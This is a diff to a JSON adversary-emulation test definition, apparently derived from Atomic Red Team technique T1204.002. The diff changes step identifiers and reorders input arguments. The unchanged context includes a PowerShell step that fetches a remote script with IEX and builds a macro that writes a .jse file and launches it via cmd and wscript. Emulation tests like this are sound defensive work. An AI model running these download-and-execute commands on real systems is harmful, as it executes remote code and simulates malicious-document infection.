@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "015b4dc3-acad-440a-becf-f3ce2a6fbfc2",
+      "id": "4062dbad-f0ba-40bd-bad9-c5f12797306f",
       "type": "execute-command",
       "data": {
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript #{jse_path}`\", vbNormalFocus)`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "f204f168-fc0d-4f94-9a34-b9f801826cb4",
+      "id": "dc4e3ee2-10b5-4e69-ae48-1aac870c62cc",
       "name": "Check dependency 1/1",
       "description": "Microsoft #{ms_product} must be installed\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": false
     },
     {
-      "id": "9d7bc653-a993-4f18-bb2a-177aa2ffab97",
+      "id": "16071a20-327e-4ab6-93bd-1035ee791f4a",
       "name": "Resolve dependency 1/1",
       "description": "Microsoft #{ms_product} must be installed\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": false
     },
     {
-      "id": "bdd6adf0-441b-40af-bcbc-51f5e6bebdaa",
+      "id": "edf0bc63-37c0-4878-95b7-b2564907ad70",
       "name": "Re-check dependency 1/1",
       "description": "Microsoft #{ms_product} must be installed\n",
       "type": "execute-command",
@@ -51,24 +51,24 @@
   ],
   "flows": [
     {
-      "s": "f204f168-fc0d-4f94-9a34-b9f801826cb4",
+      "s": "dc4e3ee2-10b5-4e69-ae48-1aac870c62cc",
       "p": "on-success",
-      "o": "015b4dc3-acad-440a-becf-f3ce2a6fbfc2"
+      "o": "4062dbad-f0ba-40bd-bad9-c5f12797306f"
     },
     {
-      "s": "f204f168-fc0d-4f94-9a34-b9f801826cb4",
+      "s": "dc4e3ee2-10b5-4e69-ae48-1aac870c62cc",
       "p": "on-failure",
-      "o": "9d7bc653-a993-4f18-bb2a-177aa2ffab97"
+      "o": "16071a20-327e-4ab6-93bd-1035ee791f4a"
     },
     {
-      "s": "9d7bc653-a993-4f18-bb2a-177aa2ffab97",
+      "s": "16071a20-327e-4ab6-93bd-1035ee791f4a",
       "p": "on-success",
-      "o": "bdd6adf0-441b-40af-bcbc-51f5e6bebdaa"
+      "o": "edf0bc63-37c0-4878-95b7-b2564907ad70"
     },
     {
-      "s": "bdd6adf0-441b-40af-bcbc-51f5e6bebdaa",
+      "s": "edf0bc63-37c0-4878-95b7-b2564907ad70",
       "p": "on-failure",
-      "o": "015b4dc3-acad-440a-becf-f3ce2a6fbfc2"
+      "o": "4062dbad-f0ba-40bd-bad9-c5f12797306f"
     }
   ],
   "tags": [
@@ -77,16 +77,16 @@
   ],
   "input_arguments": [
     {
-      "name": "jse_path",
-      "type": "path",
-      "description": "jse file to execute with wscript",
-      "value": "C:\\Users\\Public\\art.jse"
-    },
-    {
       "name": "ms_product",
       "type": "string",
       "description": "Maldoc application Word or Excel",
       "value": "Word"
+    },
+    {
+      "name": "jse_path",
+      "type": "path",
+      "description": "jse file to execute with wscript",
+      "value": "C:\\Users\\Public\\art.jse"
     }
   ]
 }
